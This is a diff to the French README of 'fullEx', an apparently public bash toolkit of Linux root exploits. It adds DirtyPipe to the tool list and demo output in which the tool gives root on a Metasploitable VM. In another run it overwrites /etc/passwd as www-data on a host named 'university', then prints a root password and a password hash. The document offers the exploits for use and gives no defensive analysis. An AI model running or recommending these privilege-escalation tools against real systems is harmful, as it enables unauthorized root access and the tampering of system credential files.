@@ -3,6 +3,8 @@
 
 Les exploits root & outils dispo :
 
+💀 DirtyPipe
+
 💀 Sudo Host
 
 💀 OverlayFS
@@ -42,7 +44,7 @@ Commands:
    -perm          Applique les droit d'execution '/fullEx'
    -help          Affiche les commandes
  ```
-# 💲 Demo
+# SudoHost
 
 ```
 vagrant@metasploitable3-ub1404:~/fullEx$ bash fullEx.sh -perm
@@ -58,4 +60,24 @@ vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -SudoHost
 root@dev# bash -i
 root@metasploitable3-ub1404:~/fullEx# id
 uid=0(root) gid=0(root) groups=0(root)
+```
+# DirtyPipe
+
+```
+www-data@university:/tmp/fullEx$ ./fullEx.sh -DirtyPipe
+./fullEx.sh -DirtyPipe
+[Dirty Pipe] Attempting to backup '/etc/passwd' to '/tmp/passwd.bak'
+[Dirty Pipe] Successfully backed up '/etc/passwd' to '/tmp/passwd.bak'
+[Dirty Pipe] Initiating write to '/etc/passwd'...
+[Dirty Pipe] Data size to write: 131 bytes
+[Dirty Pipe] File '/etc/passwd' opened successfully for reading.
+[Dirty Pipe] Pipe size determined: 65536 bytes
+[Dirty Pipe] Filling the pipe...
+[Dirty Pipe] Pipe filled successfully.
+[Dirty Pipe] Draining the pipe...
+[Dirty Pipe] Pipe drained successfully.
+[Dirty Pipe] Data successfully written to '/etc/passwd'.
+[Dirty Pipe] You can connect as root with password 'el3ph@nt!'
+[Dirty Pipe] Program execution completed successfully.
+root:$6$9WETWbCBTQ8pxg4I$odZAx8iIlayCnFdUwDM5dHVfsXXZo1RHRp2a4uQzcPDkRiTJYLA4loZESihn4ASGhWKN9.RWPT.CZJdyfTej4/:0:0:root:/root:/bin/sh
 ```
